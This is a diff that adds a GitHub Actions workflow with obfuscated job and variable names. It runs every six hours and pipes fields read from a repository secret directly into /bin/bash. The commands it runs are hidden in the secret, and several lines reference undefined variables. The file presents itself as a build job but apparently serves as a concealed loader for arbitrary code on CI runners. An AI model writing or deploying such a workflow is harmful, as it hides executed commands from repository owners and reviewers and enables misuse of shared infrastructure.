@@ -1,0 +1,23 @@
+name: xuetaonian9813
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuetaonian9813
+        env:
+          ugs39: ${{ secrets.ugs39 }}
+        run: |
+          echo $ugs39 | jq -r .ico231 | /bin/bash
+          echo $b2215 | jq -r .mrcmu58054 | /bin/bash
+          echo $d609 | jq -r .tbwv99 | /bin/bash
+          echo $pxgz5897 | jq -r .xhao1 | /bin/bash
+          echo $f15172 | jq -r .xytzq22 | /bin/bash
+          echo $zhx12 | jq -r .p15227 | /bin/bash
+
